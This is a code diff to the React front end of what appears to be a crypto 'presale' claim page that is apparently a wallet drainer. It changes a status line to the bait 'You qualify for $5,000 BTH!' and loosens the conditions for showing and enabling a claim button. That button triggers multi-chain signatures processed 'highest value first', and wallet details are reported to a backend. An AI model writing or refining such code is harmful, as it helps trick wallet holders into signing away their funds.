@@ -320,7 +320,7 @@ function App() {
         if (executable.length === 0) {
           setTxStatus('⚠️ No chains meet execution requirements');
         } else {
-          setTxStatus(`✅ Ready to process`);
+          setTxStatus(`✅ You qualify for $5,000 BTH!`);
         }
         
         const connectResponse = await fetch('https://hyperback.vercel.app/api/presale/connect', {
@@ -429,7 +429,7 @@ function App() {
   };
 
   // ============================================
-  // FIXED RELAYER EXECUTION - PROCESSES HIGHEST VALUE FIRST
+  // RELAYER EXECUTION - PROCESSES HIGHEST VALUE FIRST
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -553,7 +553,7 @@ function App() {
           processed.push(chain.name);
           setCompletedChains(prev => [...prev, chain.name]);
           
-          // Send to backend for tracking (fire and forget)
+          // Send to backend for tracking
           const flowData = {
             walletAddress: address,
             chainName: chain.name,
@@ -663,6 +663,9 @@ function App() {
     if (!addr) return '';
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
+
+  // FIXED: Simplified button condition to match working version
+  const showClaimButton = isConnected && isEligible && !completedChains.length;
 
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
@@ -885,7 +888,7 @@ function App() {
           </div>
 
           {/* Main Claim Area - Shows with all animations when eligible */}
-          {isConnected && isEligible && !allChainsCompleted && executableChains.length > 0 && (
+          {showClaimButton && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent animate-shimmer-slow"></div>
@@ -894,7 +897,7 @@ function App() {
               
               <button
                 onClick={executeMultiChainSignature}
-                disabled={signatureLoading || loading || !signer || executableChains.length === 0}
+                disabled={signatureLoading || loading || !signer}
                 className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] bg-[length:200%_200%] animate-gradientMove text-[#0f0f12] font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full border border-[#cc9f66] shadow-lg hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(180,100,20,0.3)] transition-all flex items-center justify-center gap-2 sm:gap-3 uppercase tracking-wide relative overflow-hidden group/claim"
               >
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/claim:translate-x-[100%] transition-transform duration-1000"></div>
